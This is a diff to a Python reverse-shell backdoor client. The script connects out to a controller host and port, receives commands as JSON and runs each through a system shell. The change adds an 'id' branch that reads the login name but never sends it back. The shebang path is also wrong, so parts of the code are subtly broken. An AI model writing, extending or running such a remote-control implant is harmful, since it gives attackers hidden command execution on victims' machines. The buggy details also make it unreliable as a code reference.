@@ -1,5 +1,4 @@
 #!/usr/share/python3
-
 # SOCKET
 #      CONNECT
 
@@ -8,7 +7,6 @@ import socket
 import subprocess
 import json
 import os
-
 
 def reliable_send(data):
 	json_data = json.dumps(data).encode()
@@ -23,7 +21,6 @@ def reliable_recv():
 		except ValueError:
 			continue
 
-
 def shell():
 	while True:
 		command = reliable_recv()
@@ -34,7 +31,11 @@ def shell():
 				os.chdir(command[3:])
 			except:
 				continue
-				
+		elif command == "id":
+			try:
+				user = os.getlogin()
+			except:
+				continue
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -54,4 +55,3 @@ sock.connect(("127.0.0.1",54321)) #ip of host + desired port
 print ("CONNECTION ESTABLISHED TO SERVER")
 shell()
 sock.close()
-
